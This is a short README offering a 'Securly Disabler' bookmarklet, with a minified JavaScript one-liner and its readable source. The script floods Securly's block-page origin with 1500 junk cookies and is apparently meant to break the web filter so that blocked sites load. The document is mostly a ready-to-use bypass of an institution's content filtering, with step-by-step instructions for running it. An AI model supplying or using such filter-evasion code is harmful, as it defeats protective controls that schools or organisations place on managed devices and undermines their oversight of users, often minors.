# Securly Disabler
First, go to a blocked page (ex. https://minecraft.net, https://coolmathgames.com, etc.).  
Then, bookmark that page.  
Modify that bookmark and add the following contents instead:
```js
javascript:if("https://useast-www.securly.com"!==window.location.origin)throw"flying bird";window.cookie="";var _=new Blob;function sleep(e){return new Promise(o=>setTimeout(o,e))}async function main(){for(let e=0;e<1500;e++)document.cookie=URL.createObjectURL(_)+"="+URL.createObjectURL(_),URL.revokeObjectURL(_),document.title="🐦 "+e+"/1500",await sleep(10);document.title="🐦 Done!",window.location.replace("https://google.com")}main();
```
Click on that bookmark, and wait for the "Page Unresponsive" to come up.  
Click exit, and then go to any blocked page.
## Source
```js
if (window.location.origin !== "https://useast-www.securly.com") throw "flying bird";
window.cookie = "";

var _ = new Blob();

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function main() {
    for (let i = 0; i < 1500; i++) {
        document.cookie = URL.createObjectURL(_) + "=" + URL.createObjectURL(_);
        URL.revokeObjectURL(_);

        document.title = "🐦 " + i + "/1500";
        await sleep(10);
    }

    document.title = "🐦 Done!";

    window.location.replace("https://google.com");
}

main();
```
